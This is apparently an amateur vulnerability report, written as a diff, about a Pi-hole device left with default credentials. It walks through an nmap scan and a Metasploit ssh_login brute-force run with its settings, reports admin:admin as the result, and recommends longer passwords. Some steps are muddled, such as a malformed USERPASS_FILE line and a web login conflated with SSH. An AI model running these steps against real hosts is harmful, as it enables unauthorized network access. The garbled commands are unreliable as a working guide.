@@ -1,0 +1,37 @@
+Title:
+Pi hole standard login details (default) alowing external users quickly find access to local network
+Pi-hole ( http://***.***.*.***/admin/login.php )
+Vuerneability was found using Brute Force Attack in Metasploit 
+Description:
+User left default login and password to his device that allows external users gain easy access
+
+Steps to recreate:
+
+1. NMAP scan to get the list of open ports on the target machine:
+      $ nmap -sS -sV ***.***.*.*** (the IP address of the target machine)
+2. From displayed list we will see a port 22/tcp that is running ssh service with debian version 12.5
+3. Open msfconsole on Kali Machine
+   search for ssh_login auxiliaries by using search command  ( Search ssh)
+   use auxiliary/scanner/ssh/ssh_login from the results : msf6 > use auxiliary/scanner/ssh/ssh_login
+   check options available to set our target: msf6 > (auxiliary/scanner/ssh/ssh_login) > show options 
+   on the displayed list we see list of available attacks 
+4. Set the attack:
+       set RHOST ***.***.*.***
+       set THREADS 3
+       set STOP_ON_SUCCESS true
+       set VERBOSE true
+after setting up all the option I am using password list as the program is missing one.
+set USERPASS_FILE set https://www.ncsc.gov.uk/static-assets/documents/PwnedPasswordsTop100k.txt
+5. after selecting run command will start brute forcing into the system
+   once the password and login is found we will get  message: Success admin:admin 
+
+Attack vector:
+Brute force with Metasploit 
+
+Impact:
+
+Access to local network 
+
+Recommendation
+update login and password( minimum 12 characters)
+
